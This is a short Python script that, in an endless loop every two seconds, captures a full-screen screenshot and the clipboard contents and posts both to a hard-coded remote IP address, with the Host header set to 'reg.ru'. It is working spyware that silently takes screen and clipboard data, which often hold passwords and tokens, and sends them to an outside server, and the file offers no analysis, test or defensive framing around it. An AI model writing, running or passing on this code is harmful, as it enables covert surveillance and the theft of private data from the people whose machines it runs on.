import requests
import tempfile
import mss
import os
import pyperclip
import time


def make_screenshot():
    with mss.mss() as sct:
        # Get the first monitor
        monitor = {"top": 0, "left": 0, "width": sct.monitors[1]["width"], "height": sct.monitors[1]["height"]}

        # Take a screenshot of the monitor
        sct_img = sct.grab(monitor)

        # Save the screenshot to a file in the current working directory
        filename = "screenshot.png"
        mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)

        # Send the screenshot to the remote server
        with open(filename, "rb") as img:
            headers = {'Host': 'reg.ru'}
            response = requests.post("http://134.0.118.23/screenshots", files={"screenshot": img}, headers=headers)
            if response.status_code == 200:
                print("Screenshot sent successfully")
            else:
                print("Failed to send screenshot")
                
def send_clipboard_to_server():
    clipboard_contents = pyperclip.paste()

    # Send the clipboard contents to the remote server
    headers = {'Host': 'reg.ru'}
    response = requests.post("http://134.0.118.23/clipboard", data={"clipboard_contents": clipboard_contents}, headers=headers)
    if response.status_code == 200:
        print("Clipboard contents sent successfully")
    else:
        print("Failed to send clipboard contents")

if __name__ == "__main__":
    while True:
        make_screenshot()
        send_clipboard_to_server()
        time.sleep(2)
